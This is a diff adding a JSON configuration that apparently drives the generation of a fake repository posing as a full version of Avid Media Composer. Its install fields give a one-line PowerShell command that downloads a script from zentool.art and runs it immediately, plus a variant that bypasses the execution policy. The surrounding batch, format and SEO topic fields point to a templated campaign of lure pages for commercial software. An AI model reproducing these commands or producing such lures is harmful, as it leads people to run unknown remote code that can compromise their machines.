@@ -1,0 +1,31 @@
+{
+  "repo": "Avid-Media-Composer-Full",
+  "product": "Avid Media Composer Full",
+  "product_title": "Avid Media Composer",
+  "kind": "utility",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-zentool-moltora-pending",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "system-tools",
+  "topics": [
+    "avid-media-composer",
+    "avid-media-composer-windows",
+    "avid-media-composer-desktop",
+    "avid",
+    "media",
+    "composer",
+    "disk-utility",
+    "file-management",
+    "windows-utility",
+    "desktop-tools",
+    "windows-11",
+    "windows-10",
+    "desktop-software",
+    "install-guide",
+    "windows-desktop"
+  ],
+  "site": "zentool.art"
+}
